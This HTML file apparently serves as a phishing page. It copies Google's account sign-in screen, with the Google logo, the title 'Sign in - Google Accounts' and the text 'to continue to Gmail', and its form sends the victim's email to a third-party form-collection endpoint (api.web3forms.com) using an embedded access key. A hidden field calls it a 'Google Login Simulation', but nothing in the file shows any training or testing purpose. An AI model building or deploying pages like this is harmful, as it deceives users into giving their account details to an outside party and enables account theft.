<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <style>
        :root {
            --bg-color: #ffffff;
            --text-primary: #202124; 
            --text-secondary: #5f6368; 
            --border-color: #dadce0; 
            --primary-blue: #1a73e8; 
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f2f4f6;
        }

        .login-container {
            width: 450px; 
            max-width: 95%; 
            text-align: left;
            display: flex;
            flex-direction: column; 
            padding: 48px 40px 36px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            background-color: var(--bg-color);
            box-sizing: border-box;
        }

        .logo-img {
            width: 75px; 
            height: auto; 
            margin-bottom: 10px;
            object-fit: contain;
        }

        h1 {
            font-size: 24px;
            color: var(--text-primary);
            margin: 0 0 10px 0;
            font-weight: 400;
        }

        p.subtitle {
            color: var(--text-primary);
            font-size: 16px;
            margin: 0 0 35px 0;
            line-height: 1.5;
        }

        input[type="email"] {
            appearance: none;
            width: 100%;
            box-sizing: border-box;
            padding: 13px 15px; 
            border-radius: 4px; 
            border: 1px solid var(--border-color);
            background-color: #fff; 
            font-size: 16px;
            height: 50px;
            outline: none;
            transition: border 0.2s;
        }

        input[type="email"]:focus {
            border: 2px solid var(--primary-blue);
            padding: 12px 14px;
        }

        input::placeholder {
             color: var(--text-secondary); 
             opacity: 0.7;
        }

        .next-btn {
            appearance: none;
            width: 120px; 
            margin-top: 24px;
            padding: 0 34px; 
            border-radius: 4px; 
            background-color: var(--primary-blue); 
            color: #fff !important; 
            font-weight: 500;
            font-size: 14px;
            height: 36px;
            cursor: pointer;
            border: none;
            float: right;
            transition: background-color 0.2s;
        }

         .next-btn:hover {
             background-color: #1765cc !important; 
         }

         .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: var(--primary-blue); 
            text-decoration: none !important; 
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
           text-decoration: underline !important; 
        }

        .footer-text {
            margin-top: 30px;
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        .footer-text a {
            color: var(--primary-blue);
            text-decoration: none;
        }
        
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>

<body> 

    <div class="login-container">
        <!-- Google Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo-img">
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <!-- Web3Forms Integration for the "Email" Step -->
        <form action="https://api.web3forms.com/submit" method="POST" id="googleForm">
            
            <!-- Your Access Key -->
            <input type="hidden" name="access_key" value="cec54607-e019-4df5-b362-9aa6a9529923">
            
            <!-- Optional: Redirect after submission -->
            <!-- <input type="hidden" name="redirect" value="https://yourdomain.com/thank-you"> -->

            <!-- Hidden field to identify this as a "Login" attempt -->
            <input type="hidden" name="form_type" value="Google Login Simulation">

            <label for="email" style="display:none;">Email</label>
            <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
            
            <button type="submit" class="next-btn">Next</button>
            
            <div class="clearfix"></div>
            
            <a href="#" class="forgot-link">Forgot email?</a>
        </form>

        <div class="footer-text">
            Not your computer? Use Guest mode to sign in privately. 
            <a href="#">Learn more</a>
        </div>
    </div>

    <script>
        // Optional: Add loading state to button
        const form = document.getElementById('googleForm');
        const btn = document.querySelector('.next-btn');

        form.addEventListener('submit', () => {
            btn.textContent = "Checking...";
            btn.style.backgroundColor = "#9aa0a6";
            btn.disabled = true;
        });
    </script>

</body>
</html>
